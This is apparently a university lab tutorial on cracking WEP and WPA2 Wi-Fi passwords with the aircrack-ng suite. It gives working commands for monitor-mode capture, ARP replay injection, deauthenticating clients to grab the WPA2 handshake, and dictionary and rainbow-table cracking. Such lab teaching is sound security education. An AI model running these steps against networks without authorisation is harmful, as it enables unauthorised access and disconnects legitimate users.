# WEP and WPA Password Cracking
To successfully crack WEP/WPA, you first need to be able to set your wireless network card in "monitor" mode to passively capture packets without being associated with a network.

One of the best tool/suite which can be used to **assess** WiFi Network security is [Aircrack-ng](https://github.com/aircrack-ng/aircrack-ng).

[Aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) is a complete suite of tools to assess WiFi network security.

It focuses on different areas of WiFi security:
 * Monitoring: Packet capture and export of data to text files for further processing by third party tools.
 * Attacking: Replay attacks, deauthentication, fake access points and others via packet injection.
 * Testing: Checking WiFi cards and driver capabilities (capture and injection).
 * Cracking: WEP and WPA PSK (WPA 1 and 2).

## Prerequisites
Install the `aircrack-ng` suite
 * `sudo apt install aircrack-ng`
 * `sudo apt install cowpatty`
 * `sudo apt install john`

# Crack WEP Password
## How WEP works
Generally WEP encryption works between wireless AP and wireless station (host). First of all, the **host** and the **AP** share their secret key which we commonly call as passphrase.

 1. The **host** sends an authentication request to the **AP**. In this step no data encryption takes place

 2. The **AP** responds with an authentication response message consist of challenge text

 3. Now the client uses its secret WEP key to encrypt the challenge text and sends it to the access point

 4. If the access point successfully decrypt the encrypted challenge and retrieve the original challenge text then it comes to know that the client is also using the same secret key. So responds with an **Confirmation Success** message

 5. Finally, data transfer takes place

# Start Cracking

 * The first thing we have to do is to set our network card in *monitor mode* which allows to monitor all traffic received on a wireless channel
    * `airmon-ng start <INTERFACE_NAME>`
 * Check again your network wireless card name using `iw dev` command
     * `iw dev`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WEP/2.%20iw%20dev.png?raw=true)
 * Let's now start `airodump-ng` in order to obtain some useful information about `AP Name`, `Channel` and `BSSID`
    * `airodump-ng <INTERFACE_NAME_MONITOR_MODE>`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WEP/3.%20airodump-ng.png?raw=true)
 * We can now start capturing some data using (again) `airodump-ng` command
 * `airodump-ng -c <NUM_CHANNEL> --bssid <AP_MAC_ADDRESS> -w <OUTPUT_FILE_CAPTURE> <INTERFACE_NAME_MONITOR_MODE>`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WEP/4.%20airodump-ng%20capture.png?raw=true)

## Start cracking the network password

 * If we need to receive more traffic, we can use `aireplay-ng` command which allows us to send `ARP` requests from hosts to th AP. This utility will trigger traffic through AP giving us the right amount of **Initialization Vector (IV)** in order to retrieve the password.
    * `aireplay-ng -3 <INTERFACE_NAME_MONITOR_MODE> -b <AP_MAC_ADDRESS>`
 * Meanwhile, in another terminal, we can run `aircrack-ng` (as superuser) in order to decrypt the network password
    * `aircrack-ng <OUTPUT_FILE_CAPTURE> `

## Stop Monitor Mode

Remember to disable the **monitor mode** from your wireless network card
 * `airmon-ng stop <INTERFACE_NAME>`


 # Crack WPA2 Password
## How WPA2 works
WPA2 uses dynamic key encryption, which regularly changes the key and makes it more difficult to crack.

In a WPA2-personal network, individual clients on a network are given unique encryption keys when they provide a pre-shared key.

WPA2 in mandatorily uses the **AES-CCMP** algorithm for encryption, which is much more powerful and robust than **TKIP**.

Both WPA and WPA2 allow either EAP-based authentication, using RADIUS servers (Enterprise) or a **Pre-Shared key (PSK)** (personal)-based authentication schema.

**WPA/WPA2 PSK** is vulnerable to a dictionary attack. The inputs required for this attack are the four-way WPA handshake between client and access point, and a wordlist that contains common passphrases. Then, using tools such as Aircrack-ng, we can try to crack the WPA/WPA2 PSK passphrase.

An illustration of the four-way handshake is shown in the following image

   * `airodump-ng -c <NUM_CHANNEL> --bssid <AP_MAC_ADDRESS> -w <OUTPUT_FILE_CAPTURE> <INTERFACE_NAME_MONITOR_MODE>`
 * Our goal is to capture the **WPA2 handshake**. To do that, we try to de-authenticate all hosts connected to the AP using the `aireplay-ng` command; finally, we need to wait until at least one host will  auto reconnect to the AP
   * `aireplay-ng -0 2 -a <AP_MAC_ADDRESS> <INTERFACE_NAME_MONITOR_MODE>`

 * Once the WPA2 handshake has been captured, we can start hacking the password

## Bruteforce attack using dictionaries
One of the things that we will try out with breaking through WPA and WPA2, is by using a dictionary attack. Dictionary attack is a technique to break through an authentication mechanism by trying to figure out it’s decryption key or passphrase by trying out hundreds, thousands or even billions of likely possibilities. Most vulnerable victims of this attacks are Wi-Fi’s that have their password set to something simple, such as `cat`, `dog`, `airplane`, `football` and so on - like the words in a dictionary

### Create a dictionary using `cruch` tool
One of the possibility is to self create a dictionary using some CLI tools. `cruch` allows us to create dictionaries specifying many parameters such as `min` and `max` password length, `charset` and even `patterns`
 * `crunch <min_lenght> <max_lenght> charset [-t <pattern> ] -o dictionary.txt`

For example, in order to create a dictionary containing all the words from 5 to 8 chars only in lowercase, we can execute the following command
 * `crunch 5 8 qwertyuiopasdfghjklzxcvbnm -o dictionary.txt`

In our exercises, we will use some dictionaries which can be downloaded from the Iternet. The first one is called `john dictionary` whereas the second one is called `rockyou dictionary`
```
sudo su
apt install john
mkdir /usr/share/rockyou
cd /usr/share/rockyou
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

After that, the dictionaries can be found in the `/usr/share/john` and `/usr/share/rockyou` folders, respectively.

## Start a `Bruteforce` attack
We can now start the bruteforce attack. We suggest to use `john` and/or `rockyou` dictionary to complete the exercise before the end of the laboratory session

 * `aircrack-ng -w <YOUR_DICTIONARY_FILE> <OUTPUT_FILE_CAPTURE>.cap`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/5.%20bruteforce.png?raw=true)

## Start a `Rainbow Table` attack
`Rainbow Tables` are pre-computed tables of hash values that are pre-matched to possible plain text passwords. Rainbow tables are mainly used to crack hashes very quickly.

### Advantages of using Rainbow table
 * Searching the rainbow table is very fast
 * Once created, it does not require computing resources
 * Once created, you can use it on multiple wireless access points

### Disadvantages of using Rainbow table
 * It takes up a lot of space, much more than just the password file
 * The process of combining the password and the ESSID to create the PMK takes a good bit of time

Computing rainbow tables takes exactly the same amount of time as a brute force, but searching the generated rainbow table takes a split second. So, if you want to test one handshake per an Access Point, then there is no difference between brute-force and using rainbow tables

A `rainbow table` can be created using the `genpmk` command (starting from a dictionary) and can be used using `cowpatty` command
```
sudo su
apt install cowpatty
genpmk -f <PATH_TO_DICTIONARY> -s <NETWORK_SSID> -d <OUTPUT_RAINBOW_TABLE>
```

Cowpatty can be executed in the following way
 * `cowpatty -d <OUTPUT_RAINBOW_TABLE> -r <OUTPUT_FILE_CAPTURE> -s <<NETWORK_SSID>>`

## Stop Monitor Mode

Remember to disable the **monitor mode** from your wireless network card
 * `airmon-ng stop <INTERFACE_NAME>`
